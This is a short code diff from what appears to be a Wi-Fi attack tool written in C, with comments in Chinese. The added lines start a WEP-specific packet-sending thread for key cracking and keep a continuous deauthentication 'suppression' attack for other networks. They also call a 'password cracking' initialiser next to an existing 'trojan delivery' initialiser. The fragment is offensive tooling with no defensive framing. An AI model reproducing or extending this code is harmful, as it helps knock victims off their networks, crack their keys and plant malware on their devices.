@@ -188,7 +188,12 @@ void atk_task(void)
 				system("wifi");
 #endif
 				if(DecryptOn == true){
-					pthread_create(&pth1, NULL, do_deauth_atk, &sendnum);//开启持续压制线程
+					if(WifiDecrypt.encrypt == STD_WEP){
+						pthread_create(&pth1, NULL, send_buffer_thread, NULL);
+					}
+					else {
+						pthread_create(&pth1, NULL, do_deauth_atk, &sendnum);//开启持续压制线程
+					}
 					sleep(3);
 				}
 				else {
@@ -378,7 +383,7 @@ int main(int argc, char * argv[])
     read_user_config();
     mmget_init();//木马下发初始化
 	memset(default_gw_ip,0,sizeof(default_gw_ip));//获取默认网关
-
+	wifi_decrypt_init();//破密初始化
 	//printf("default gw id %s",default_gw_ip);
 
 	init_status();//初始化程序状态
